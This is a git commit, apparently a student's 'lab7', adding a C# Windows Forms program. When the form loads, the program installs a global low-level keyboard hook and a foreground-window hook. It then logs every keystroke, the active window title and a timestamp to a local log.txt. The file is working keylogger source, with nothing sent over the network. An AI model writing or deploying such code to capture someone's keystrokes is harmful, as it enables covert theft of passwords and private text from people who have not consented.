96a4409359a81f4f2e77b17d5f873656610d3625
ViktoriyaMosolova <mosolova.viktoriya@mail.ru>
2023-04-15 12:41:01 +0300

    add lab7

---
+++ lab7/WindowsFormsApp7/Form1.cs
@@ -0,0 +1,160 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.IO;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace WindowsFormsApp7
+{
+    public partial class Form1 : Form
+    {
+        internal enum HookType : int
+        {
+            WH_JOURNALRECORD = 0,
+            WH_JOURNALPLAYBACK = 1,
+            WH_KEYBOARD = 2,
+            WH_GETMESSAGE = 3,
+            WH_CALLWNDPROC = 4,
+            WH_CBT = 5,
+            WH_SYSMSGFILTER = 6,
+            WH_MOUSE = 7,
+            WH_HARDWARE = 8,
+            WH_DEBUG = 9,
+            WH_SHELL = 10,
+            WH_FOREGROUNDIDLE = 11,
+            WH_CALLWNDPROCRET = 12,
+            WH_KEYBOARD_LL = 13,
+            WH_MOUSE_LL = 14
+        }
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100; 
+
+        private static readonly string logFile = Path.Combine(Directory.GetCurrentDirectory(), "log.txt");
+        private static readonly object locker = new object();
+
+        private readonly LowLevelKeyboardProc keyboardProc;
+        private readonly WinEventDelegate winEventDelegate;
+
+        private IntPtr keyboardHookId = IntPtr.Zero;
+        private IntPtr foregroundHookId = IntPtr.Zero;
+
+        public Form1()
+        {
+            InitializeComponent();
+            keyboardProc = HookCallback;
+            winEventDelegate = WinEventCallback;
+        }
+
+        private void Form1_Load_1(object sender, EventArgs e)
+        {
+                keyboardHookId = SetKeyboardHook(keyboardProc);
+                foregroundHookId = SetForegroundHook(winEventDelegate);
+        }
+
+        private IntPtr SetKeyboardHook(LowLevelKeyboardProc proc)
+        {
+            using (ProcessModule module = Process.GetCurrentProcess().MainModule)
+            {
+                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(module.ModuleName), 0);
+            }
+        }
+
+        private IntPtr SetForegroundHook(WinEventDelegate proc)
+        {
+            return SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, proc, 0, 0, WINEVENT_OUTOFCONTEXT);
+        }
+
+        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                string windowTitle = GetActiveWindowTitle();
+
+                string logMessage = $"{DateTime.Now} - KeyDown: {vkCode} или {(char)vkCode}, Window: {windowTitle}";
+
+                lock (locker)
+                {
+                    File.AppendAllText(logFile, logMessage + Environment.NewLine);
+                }
+            }
+
+            return CallNextHookEx(keyboardHookId, nCode, wParam, lParam);
+        }
+
+        private void WinEventCallback(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
+        {
+            string windowTitle = GetActiveWindowTitle();
+
+            string logMessage = $"{DateTime.Now} - ForegroundWindowChanged: {windowTitle}";
+
+            lock (locker)
+            {
+                File.AppendAllText(logFile, logMessage + Environment.NewLine);
+            }
+        }
+
+        private string GetActiveWindowTitle()
+        {
+            IntPtr hWnd = GetForegroundWindow();
+
+            if (hWnd == IntPtr.Zero)
+            {
+                return "";
+            }
+
+            int length = GetWindowTextLength(hWnd);
+            StringBuilder sb = new StringBuilder(length + 1);
+            GetWindowText(hWnd, sb, length + 1);
+
+            return sb.ToString();
+        }
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        private delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);
+
+        private const uint EVENT_SYSTEM_FOREGROUND = 0x0003;
+        private const uint WINEVENT_OUTOFCONTEXT = 0;
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern bool UnhookWinEvent(IntPtr hWinEventHook);
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        private static extern int GetWindowTextLength(IntPtr hWnd);
+
+        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpWindowText, int nMaxCount);
+
+        private void pictureBox1_Click(object sender, EventArgs e)
+        {
+            MessageBox.Show("Не тыкай на меня(((");
+        }
+    }
+}
